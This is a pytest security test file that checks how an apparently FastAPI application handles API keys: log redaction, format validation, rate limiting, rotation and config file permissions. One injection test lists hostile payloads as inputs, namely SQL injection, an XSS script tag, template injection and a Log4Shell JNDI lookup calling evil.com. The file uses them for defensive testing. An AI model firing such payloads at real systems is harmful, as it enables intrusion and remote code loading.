"""
Security tests for API key handling and management.
Ensures secure storage, transmission, and validation of API keys.
"""

import pytest
import os
import json
from unittest.mock import patch, MagicMock

from src.app import app
from fastapi.testclient import TestClient


@pytest.mark.security
class TestApiKeyHandling:
    """Security tests for API key management."""

    def test_api_key_not_logged(self, test_client, caplog):
        """Ensure API keys are never logged in plain text."""
        api_key = "sk-ant-api03-test-key-1234567890abcdef"
        
        # Make request with API key
        headers = {"Authorization": f"Bearer {api_key}"}
        response = test_client.post("/query", 
            json={"query": "test query"},
            headers=headers
        )
        
        # Check that API key doesn't appear in logs
        log_output = caplog.text
        assert api_key not in log_output
        assert "sk-ant-api03" not in log_output
        
        # Check for masked/redacted versions
        assert "[REDACTED]" in log_output or "***" in log_output or api_key[:8] + "..." in log_output

    def test_api_key_validation(self, test_client):
        """Test proper API key format validation."""
        invalid_keys = [
            "",
            "invalid-key",
            "sk-ant-",
            "sk-proj-short",
            "wrong-prefix-1234567890abcdef",
            "sk-ant-api03-" + "x" * 100,  # Too long
        ]
        
        for invalid_key in invalid_keys:
            headers = {"Authorization": f"Bearer {invalid_key}"}
            response = test_client.post("/query",
                json={"query": "test query"},
                headers=headers
            )
            
            assert response.status_code in [401, 403, 422], \
                f"Invalid key '{invalid_key}' should be rejected"

    def test_api_key_injection_prevention(self, test_client):
        """Test prevention of API key injection attacks."""
        malicious_payloads = [
            "sk-ant-api03-test'; DROP TABLE users; --",
            "sk-ant-api03-test<script>alert('xss')</script>",
            "sk-ant-api03-test{{7*7}}",
            "sk-ant-api03-test${jndi:ldap://evil.com/a}",
            "sk-ant-api03-test\x00\x01\x02",  # Null bytes
            "sk-ant-api03-test\n\r\t",  # Control characters
        ]
        
        for payload in malicious_payloads:
            headers = {"Authorization": f"Bearer {payload}"}
            response = test_client.post("/query",
                json={"query": "test query"},
                headers=headers
            )
            
            # Should reject malicious payloads
            assert response.status_code in [401, 403, 422]
            
            # Response should not echo back the malicious payload
            response_text = response.text.lower()
            assert "drop table" not in response_text
            assert "<script>" not in response_text
            assert "jndi:" not in response_text

    def test_api_key_storage_security(self, security_test_data):
        """Test secure API key storage practices."""
        # Simulate configuration storage
        config_data = {
            "claude_api_key": security_test_data["valid_api_keys"][0],
            "openai_api_key": security_test_data["valid_api_keys"][1]
        }
        
        # API keys should never be stored in plain text
        config_json = json.dumps(config_data)
        
        # In a real implementation, keys should be encrypted or use secure storage
        # For testing, verify that plain text storage is avoided
        with patch("builtins.open", create=True) as mock_open:
            mock_file = MagicMock()
            mock_open.return_value.__enter__.return_value = mock_file
            
            # Simulate writing config
            mock_file.write.side_effect = lambda data: None
            
            # In production, this should use encryption
            # Here we test that the interface doesn't expose plain text
            assert "sk-ant-api03" not in str(mock_file.write.call_args_list)

    def test_api_key_transmission_security(self, test_client):
        """Test secure API key transmission."""
        api_key = "sk-ant-api03-test-key-1234567890abcdef"
        
        # API keys should only be sent over HTTPS in production
        # Test that the application enforces secure headers
        
        headers = {
            "Authorization": f"Bearer {api_key}",
            "X-Forwarded-Proto": "http"  # Simulate non-HTTPS
        }
        
        response = test_client.post("/query",
            json={"query": "test query"},
            headers=headers
        )
        
        # In production, should enforce HTTPS
        # For testing, verify security headers are set
        security_headers = [
            "strict-transport-security",
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection"
        ]
        
        # At least some security headers should be present
        response_headers = {k.lower(): v for k, v in response.headers.items()}
        present_headers = [h for h in security_headers if h in response_headers]
        assert len(present_headers) > 0, "No security headers found"

    def test_api_key_rate_limiting(self, test_client):
        """Test rate limiting based on API key."""
        api_key = "sk-ant-api03-test-key-1234567890abcdef"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        # Make multiple rapid requests
        responses = []
        for i in range(10):
            response = test_client.post("/query",
                json={"query": f"test query {i}"},
                headers=headers
            )
            responses.append(response.status_code)
        
        # Should eventually hit rate limits
        rate_limited = any(status == 429 for status in responses)
        
        # Note: This test assumes rate limiting is implemented
        # In a real implementation, this would verify rate limiting works
        # For now, just ensure requests don't all succeed without limits
        if not rate_limited:
            # If no rate limiting, at least verify consistent behavior
            assert all(status in [200, 400, 422] for status in responses)

    def test_api_key_revocation_handling(self, test_client):
        """Test handling of revoked API keys."""
        revoked_key = "sk-ant-api03-revoked-key-1234567890"
        headers = {"Authorization": f"Bearer {revoked_key}"}
        
        # Simulate revoked key response
        with patch("src.app.validate_api_key") as mock_validate:
            mock_validate.return_value = False
            
            response = test_client.post("/query",
                json={"query": "test query"},
                headers=headers
            )
            
            assert response.status_code == 401
            assert "revoked" in response.text.lower() or "invalid" in response.text.lower()

    def test_api_key_scope_validation(self, test_client):
        """Test API key scope and permission validation."""
        # Different API keys might have different scopes
        limited_scope_key = "sk-ant-api03-limited-1234567890abcdef"
        full_scope_key = "sk-ant-api03-full-1234567890abcdef"
        
        # Test limited scope key
        headers = {"Authorization": f"Bearer {limited_scope_key}"}
        response = test_client.post("/vault-analysis",
            json={"focus_areas": ["patterns"]},
            headers=headers
        )
        
        # Limited scope might not allow certain operations
        # Implementation-specific behavior
        assert response.status_code in [200, 403, 404]

    def test_api_key_environment_separation(self):
        """Test that API keys are properly separated by environment."""
        with patch.dict(os.environ, {"ENVIRONMENT": "production"}):
            prod_key = "sk-ant-api03-prod-key-1234567890abcdef"
            
            # Production keys should not work in test environment
            # This would be implementation-specific
            assert prod_key != os.environ.get("CLAUDE_API_KEY", "")

    def test_api_key_rotation_support(self, test_client):
        """Test support for API key rotation."""
        old_key = "sk-ant-api03-old-key-1234567890abcdef"
        new_key = "sk-ant-api03-new-key-1234567890abcdef"
        
        # During rotation, both keys might be valid temporarily
        for key in [old_key, new_key]:
            headers = {"Authorization": f"Bearer {key}"}
            response = test_client.post("/query",
                json={"query": "test query"},
                headers=headers
            )
            
            # Response should be consistent regardless of which key is used
            assert response.status_code in [200, 401, 422]

    def test_api_key_leak_prevention(self, test_client, caplog):
        """Test prevention of API key leaks in error messages."""
        api_key = "sk-ant-api03-leak-test-1234567890abcdef"
        
        # Trigger various error conditions
        error_scenarios = [
            {"json": None, "headers": {"Authorization": f"Bearer {api_key}"}},
            {"json": {"query": ""}, "headers": {"Authorization": f"Bearer {api_key}"}},
            {"json": {"invalid": "data"}, "headers": {"Authorization": f"Bearer {api_key}"}},
        ]
        
        for scenario in error_scenarios:
            response = test_client.post("/query", **scenario)
            
            # API key should not appear in error responses
            assert api_key not in response.text
            assert api_key[:10] not in response.text  # Partial key
            
            # Check logs for leaks
            log_output = caplog.text
            assert api_key not in log_output

    @pytest.mark.parametrize("header_name", [
        "Authorization",
        "X-API-Key", 
        "Bearer",
        "Token"
    ])
    def test_api_key_header_variations(self, test_client, header_name):
        """Test handling of different API key header formats."""
        api_key = "sk-ant-api03-test-key-1234567890abcdef"
        
        if header_name == "Authorization":
            headers = {header_name: f"Bearer {api_key}"}
        else:
            headers = {header_name: api_key}
        
        response = test_client.post("/query",
            json={"query": "test query"},
            headers=headers
        )
        
        # Should handle standard Authorization header
        if header_name == "Authorization":
            assert response.status_code in [200, 422]
        else:
            # Other headers might not be supported
            assert response.status_code in [200, 401, 422]

    def test_api_key_concurrent_usage(self, test_client):
        """Test concurrent usage of the same API key."""
        import threading
        import time
        
        api_key = "sk-ant-api03-concurrent-test-1234567890"
        headers = {"Authorization": f"Bearer {api_key}"}
        results = []
        
        def make_request(request_id):
            response = test_client.post("/query",
                json={"query": f"concurrent test {request_id}"},
                headers=headers
            )
            results.append((request_id, response.status_code))
        
        # Start multiple concurrent requests
        threads = []
        for i in range(5):
            thread = threading.Thread(target=make_request, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # All requests should be handled appropriately
        assert len(results) == 5
        for request_id, status_code in results:
            assert status_code in [200, 429, 422]  # Success, rate limited, or validation error


@pytest.mark.security
class TestApiKeyConfiguration:
    """Tests for API key configuration security."""

    def test_environment_variable_security(self):
        """Test secure handling of API keys in environment variables."""
        # Environment variables should be used for API keys
        # Never hardcoded in source code
        
        with patch.dict(os.environ, {"CLAUDE_API_KEY": "test-key"}):
            # Verify environment variable is read
            assert os.environ.get("CLAUDE_API_KEY") == "test-key"
            
            # Verify it's not hardcoded (would be caught by static analysis)
            # This is more of a development practice test
            assert True  # Placeholder for static analysis integration

    def test_configuration_file_security(self, tmp_path):
        """Test secure configuration file handling."""
        config_file = tmp_path / "config.json"
        
        # Configuration files should have restricted permissions
        config_data = {"api_key": "sk-ant-api03-config-test-123"}
        
        with open(config_file, "w") as f:
            json.dump(config_data, f)
        
        # Set restrictive permissions (owner read/write only)
        os.chmod(config_file, 0o600)
        
        # Verify permissions are restrictive
        stat_info = os.stat(config_file)
        permissions = oct(stat_info.st_mode)[-3:]
        assert permissions == "600", f"Config file permissions {permissions} too permissive"

    def test_key_validation_errors_dont_leak_info(self, test_client):
        """Test that key validation errors don't leak information."""
        # Try keys with different invalid patterns
        test_keys = [
            "sk-ant-api03-almost-valid-but-wrong",
            "sk-ant-api03-" + "x" * 32,  # Wrong length
            "sk-openai-" + "x" * 32,     # Wrong service
        ]
        
        for key in test_keys:
            headers = {"Authorization": f"Bearer {key}"}
            response = test_client.post("/query",
                json={"query": "test"},
                headers=headers
            )
            
            # Error messages should be generic
            assert response.status_code in [401, 403]
            error_text = response.text.lower()
            
            # Should not reveal specific validation failures
            assert "length" not in error_text
            assert "format" not in error_text
            assert "service" not in error_text
            
            # Should use generic error message
            assert any(word in error_text for word in ["unauthorized", "invalid", "forbidden"])